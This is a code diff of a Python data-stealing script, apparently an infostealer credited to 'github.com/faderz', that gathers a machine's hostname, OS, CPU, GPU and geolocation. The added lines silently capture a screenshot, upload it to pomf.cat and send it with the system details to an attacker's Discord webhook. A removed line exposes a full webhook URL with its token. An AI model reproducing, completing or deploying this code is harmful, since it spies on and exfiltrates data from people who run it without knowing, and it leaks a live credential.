@@ -17,7 +17,7 @@ from time import sleep
 from sys import argv
 
 # CHANGE THESE VALUES
-webhook_url = "https://canary.discord.com/api/webhooks/922621460483285073/ijFTaxdh7UTAKIeufnKHWBEMtJSGOK1j3ndCjC390NkCsD2SnkM4mnHpp7uW8B2BX7qm" # Your Discord webhook URL where logs will be sent
+webhook_url = "" # Your Discord webhook URL where logs will be sent
 
 # DO NOT CHANGE THESE VALUES
 
@@ -42,7 +42,7 @@ PATHS = {
 
 # Get system information and store each piece in a variable
 hostname = platform.uname().node
-os = platform.system() + " " + platform.release() + " " + platform.version()
+operatingsystem = platform.system() + " " + platform.release() + " " + platform.version()
 
 # Get system specs and store each piece in a variable with platform module
 cpu = platform.processor()
@@ -65,16 +65,15 @@ timezone = geolocation2["timezone"]
 
 # REMOVED FOR SECURITY REASONS - ADD THIS PART ON YOUR OWN
 
-
-### Screenshot - Currently only works on Windows ###
-
-def screenshot():
-    takess = pyautogui.screenshot('temp.png')
-    uploadapi = "https://catbox.moe/user/api.php"
-    screenshot = open("temp.png", "rb")
-    
-
-screenshot()
+### Screenshot - Only tested on windows ###
+# take a screenshot and save it to the current directory
+screenshot = pyautogui.screenshot()
+screenshot.save("screenshot.png")
+# upload the screenshot to pomf.cat
+files = {'files[]': open('screenshot.png', 'rb')}
+r = requests.post('https://pomf.cat/upload.php', files=files)
+screenshot_url = r.json()['files'][0]['url']
+image_url = "https://a.pomf.cat/" + screenshot_url
 
 ### Webhook function ###
 
@@ -85,7 +84,7 @@ data = {
 data["embeds"] = [
     {
       "title": ":computer: System Information:",
-      "description": "Hostname: **{user}**\nOperating System: **{os}**\nCPU: **{cpu}**\nGPU: **{gpu}**".format(os=os, cpu=cpu, user=hostname, gpu=gpu),
+      "description": "Hostname: **{user}**\nOperating System: **{operatingsystem}**\nCPU: **{cpu}**\nGPU: **{gpu}**".format(operatingsystem=operatingsystem, cpu=cpu, user=hostname, gpu=gpu),
       "color": 16711680,
       "footer": {
         "text": "github.com/faderz"
@@ -97,6 +96,16 @@ data["embeds"] = [
       "color": 16711680,
       "footer": {
         "text": "github.com/faderz"
+      }
+    },
+    {
+      "title": "Screenshot",
+      "color": 16711680,
+      "footer": {
+        "text": "github.com/faderz"
+      },
+      "image": {
+        "url": image_url
       }
     },
 ]
